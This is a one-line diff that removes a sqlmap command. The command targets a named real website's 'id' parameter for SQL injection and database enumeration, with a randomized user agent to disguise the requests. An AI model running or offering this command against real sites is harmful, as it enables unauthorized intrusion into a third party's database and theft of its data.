@@ -1,1 +1,0 @@
-python sqlmap.py -u "www.cowinbio.com/about/index.php?id=1*" --dbs --random-agent
